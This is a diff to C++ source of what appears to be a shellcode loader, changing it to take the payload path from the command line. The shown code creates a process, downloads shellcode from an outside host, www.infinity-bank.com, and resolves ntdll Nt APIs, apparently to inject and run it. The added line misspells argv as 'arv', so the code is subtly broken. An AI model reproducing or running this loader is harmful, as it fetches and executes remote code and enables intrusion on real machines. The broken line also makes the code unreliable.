@@ -11,7 +11,7 @@
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 
 
-int main()
+int main(int argc, char *argv[])
 {
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
@@ -38,7 +38,9 @@ int main()
         process_info);
 
     // download shellcode
-    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"/shellcode.bin\0");
+    std::string p = arv[1];
+    std::wstring ptemp = std::wstring(p.begin(), p.end());
+    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", ptemp.c_str());
 
     // find Nt APIs
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
